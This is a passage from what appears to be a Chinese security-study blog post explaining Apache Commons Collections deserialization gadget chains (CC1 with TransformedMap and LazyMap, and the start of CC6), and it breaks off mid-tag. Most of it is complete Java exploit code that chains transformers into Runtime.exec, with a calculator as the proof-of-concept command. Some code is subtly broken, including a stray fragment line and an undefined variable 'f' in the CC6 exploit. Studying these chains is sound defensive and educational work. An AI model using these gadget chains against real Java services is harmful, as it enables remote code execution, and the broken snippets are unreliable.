<p>其实这两个问题可以一次解决<br>就是如下两个类<br><img src="/2024/09/25/CC%E9%93%BE/CC14.png" class="" title="alt text"><br><img src="/2024/09/25/CC%E9%93%BE/CC1_15.png" class="" title="alt text"><br>我们可以通过代码知道<code>ChainedTransformer</code>其实例化的参数是一个数组，而其再调用transform时会通过循环让数组中的每个类都调用transform，而前一个调用transform返回的值作为下一个的transform的参数。<br>如下代码<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br></pre></td></tr></table></figure><br>在数组中传入ConstantTransformer而其调用Transformer后会返回实例化传入的参数原值即其返回Runtime.class作为下一个InvokerTransformer的transformer来进行调用，如此循环最终就可以命令执行<br>所以我们将chainedTransformer传入TransformedMap中当遍历map时就会调用到chainedTransformer的transformer<br>这时我们可以写出如下exp<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        </span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>但是这个exp还是有点问题我们可以下个断点调试一下<br><img src="/2024/09/25/CC%E9%93%BE/CC1_16.png" class="" title="alt text"><br>我们可以看到其最后通过get(name)来得到type即我们传入的注解类中的属性。<br>而name的值就是我们的map的key，那么我们只要在map.put传入key为注解类的属性名即可<br><img src="/2024/09/25/CC%E9%93%BE/CC1_17.png" class="" title="alt text"><br>我们传入一个map的key为value<br>即可命令执行，exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformerMap=TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Constructor constructor=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(Target.class,transformerMap);</span><br><span class="line">        </span><br><span class="line">        Serializ(o);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1_LazyMap"></a>CC1_LazyMap</h1><p>ysoserial中其CC1的调用链并没用用到TransformerMap而是使用了LazyMap，使用这个类来构造其实难度会比TransformerMap来的大，因为其需要用的一个java的概念，即动态代理。<br>我们先来看一下LazyMap是如何调用transform的<br><img src="/2024/09/25/CC%E9%93%BE/lazy1.png" class="" title="alt text"><br>我们可以发现其是在get下调用了transform，但是这个get方法我们在AnnotationInvocationHandler下的readObject是找不到调用的，反而在invoke中找到了这个调用。<br><img src="/2024/09/25/CC%E9%93%BE/lazy2.png" class="" title="alt text"><br>并且我们可以发现AnnotationInvocationHandler这个类是一个完成了InvocationHandler接口的类。那么我们使用一个Map的动态代理传入第三个参数为AnnotationInvocationHandler，那么这个代理在调用任意方法时都会跳到invoke中。进而执行invoke中的memberValues.get(member);来命令执行<br>其链子的后半段无改变<br>我们写一个命令执行的demo<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       (<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">       Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">       Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">       Map lazyMap= LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">       Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">       Constructor constructor=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">       constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">       Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">       proxyMap.entrySet();</span><br></pre></td></tr></table></figure><br>其实上面的demo中的proxy代理任意接口都可以弹出计算机，但是因为我们的反序列化入口点是AnnotationInvocationHandler的readObject，所以我们还需要将proxy传入AnnotationInvocationHandler，而其readObject下调的是entrySet()如下<br><img src="/2024/09/25/CC%E9%93%BE/lazy3.png" class="" title="alt text"><br>即我们传入的proxy要可以调用entrySet()这样才可以正常进入invoke，而这个方法是在Map里定义的，所以我们的接口要定义为Map<br>exp如下<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap= LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,lazyMap);</span><br><span class="line">        Map proxyMap= (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        InvocationHandler inv=(InvocationHandler)constructor.newInstance(Target.class,proxyMap);</span><br><span class="line">        Serializ(inv);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>学习这跳链子的目的是因为我们学习的CC1在高版本的JDK8u71以后就无法使用这是因为，在jdk8u71后对AnnotationInvocationHandler的readObject进行了更改。如下<br><img src="/2024/09/25/CC%E9%93%BE/CC6_1.png" class="" title="alt text"></p>
<p>我们可以发现CC1的两给分支TransformerMap和LazyMap位于readObject的触发点都修复了导致我们无法对其进行利用</p>
<p>所以我们需要学习这条CC6<br>CC6这条链子的后半段其实和CC1_LazyMap那条是没什么差别的，因为java高版本修改了AnnotationInvocationHandler所以我们只能在其他类里寻找调用了get的方法。</p>
<p>最后我们可以在TiedMapEntry里找到一个getValue调用了map.get()<br><img src="/2024/09/25/CC%E9%93%BE/CC6_2.png" class="" title="alt text"><br>继续找可以在同类下的hashCode()下发现调用了getValue()。<br><img src="/2024/09/25/CC%E9%93%BE/CC6_3.png" class="" title="alt text"><br>看到这个hashCode，死去的回忆一下子开始攻击我了。我们在之前学习的URLDNS就有利用到hashCode(),那么剩下的调用链不是和URLDNS一样嘛。</p>
<p>通过HashMap的readObject可以调用到hash()，hash()方法下调用了hashCode。</p>
<p>就这样我们可以写出如下exp<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serializ</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ByteArrayOutputStream bos=<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = bos.toByteArray();</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> encoder.encodeToString(byteArray);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserializ</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] Transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformer);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; ser_map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        ser_map.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, Transformer);</span><br><span class="line">        Serializ(ser_map);</span><br><span class="line">        Unserializ(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>但是很可惜，我们在执行时会发现其在反序列前的ser_map.put弹出了计算机，但是反序列化时却不会触发命令执行。同样的我们一个断点来调试<br><img src="/2024/09/25/CC%E9%93%BE/CC6_4.png" class="" title="alt 